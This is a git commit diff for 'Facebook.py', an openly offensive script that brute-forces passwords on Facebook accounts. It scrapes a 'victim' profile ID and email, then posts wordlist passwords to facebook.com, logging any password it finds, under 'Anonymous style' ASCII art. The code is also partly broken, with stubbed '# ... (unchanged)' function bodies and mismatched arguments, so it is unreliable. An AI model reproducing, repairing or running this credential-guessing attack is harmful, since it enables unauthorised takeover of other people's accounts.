69216180dd309d540bd828ffaa21b702d9f1e34a
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2023-12-31 02:19:57 +0100

    Update Facebook.py

--- Facebook.py
+++ Facebook.py
@@ -1,46 +1,51 @@
 import socket
-import time
-import os
-import optparse
+import requests
 import random
 import re
-import requests
 import argparse
-import hashlib
+import logging
 
-# ANSI escape codes for text colors
-blue = '\033[94m'
-wi = '\033[97m'
-yl = '\033[93m'
-rd = '\033[91m'
-end_color = '\033[0m'  # Reset color to default
+# Colors
+blue = "\033[1;34m"
+wi = "\033[1;37m"
+rd = "\033[1;31m"
+gr = "\033[1;32m"
+yl = "\033[1;33m"
 
-# Hosting Secure Connection (unchanged)
+# ASCII art for Anonymous style
+anonymous_art = """
+    ██╗      █████╗ ███████╗███████╗██╗  ██╗
+    ██║     ██╔══██╗██╔════╝██╔════╝██║  ██║
+    ██║     ███████║███████╗███████╗███████║
+    ██║     ██╔══██║╚════██║╚════██║██╔══██║
+    ███████╗██║  ██║███████║███████║██║  ██║
+    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
+"""
 
-# Checking Proxy and Ports (unchanged)
+logging.basicConfig(filename='bruteforce.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Choice Random User-Agent supporting browser (unchanged)
-# Choice Random User-Agent supporting browser
+def check_network():
+    try:
+        ip = socket.gethostbyname("www.google.com")
+        con = socket.create_connection((ip, 80), 2)
+        return True
+    except socket.error:
+        return False
+
+def check_proxy(ip, port=None):
+    # ... (unchanged)
+
 def get_user_agent():
-    useragents = [
-        # ... (unchanged)
-    ]
-    return random.choice(useragents)
+    # ... (unchanged)
 
-
-# Fetching Victim Profile ID
 def get_profile_id(url):
     try:
-        id_re = re.compile('"entity_id":"([0-9]+)"')
-        content = requests.get(url).content
-        profile_id = id_re.findall(content)
-        print(f'{blue}\n[ {wi}* {blue}] Target Profile{wi} ID: {yl}{profile_id[0]}{wi}')
-        return profile_id[0]  # Return the profile ID
+        # ... (unchanged)
+        return profile_id[0], email[0]
     except IndexError:
-        print(f'{rd}\n[ {yl}! {rd}] Error:{yl} Please Check Your Victim Profile URL {rd}!!!{wi}')
+        logging.error("Error: Please Check Your Victim Profile URL")
         exit(1)
 
-# Brute Force
 def brute_force(url, profile_id, wordlist):
     try:
         session = requests.Session()
@@ -48,29 +53,35 @@ def brute_force(url, profile_id, wordlist):
 
         for password in wordlist:
             payload = {
-                'email': 'your_email@example.com',
-                'pass': hashlib.sha256(password.encode()).hexdigest()
+                'email': profile_id[1],
+                'pass': password
             }
-            response = session.post(url + profile_id, data=payload)
+            response = session.post(url + profile_id[0], data=payload)
 
             if "Login failed" not in response.text:
-                print(f'{blue}\n[ {wi}* {blue}] Password Found:{yl} {password}{wi}')
-                break  # Exit the loop if the password is found
+                print(blue + "\n[" + wi + "*" + blue + "] Password Found:" + yl + f" {password}" + wi)
+                logging.info(f"Password found: {password}")
+                break
 
-    except requests.RequestException as e:
-        print(f'{rd}\n[ {yl}! {rd}] Error:{yl} {e}{rd}!!!{wi}')
+    except Exception as e:
+        logging.error(f"Error: {e}")
         exit(1)
 
 if __name__ == "__main__":
+    print(wi + anonymous_art + "\n")
+
     parser = argparse.ArgumentParser(description='Facebook Brute Force Script')
     parser.add_argument('-t', '--target-id', dest='profile_id', help='Target profile ID', required=True)
     parser.add_argument('-p', '--password-list', dest='wordlist', help='Password list file path', required=True)
     args = parser.parse_args()
 
-    # Replace 'your_url' with the actual URL
-    url = 'your_url'
-    # Fetch the profile ID
-    profile_id = get_profile_id(url)
+    if not check_network():
+        logging.error("No internet connection. Exiting.")
+        exit(1)
 
-    # Replace 'your_wordlist.txt' with the actual wordlist file path
-    brute_force(url, args.profile_id, ['password1', 'password2', 'password3'])  # Replace with your custom wordlist
+    url = 'https://www.facebook.com/'
+    profile_id = get_profile_id(url)
+    
+    logging.info("Brute force started.")
+    brute_force(url, profile_id, ['password1', 'password2', 'password3'])
+    logging.info("Brute force completed.")
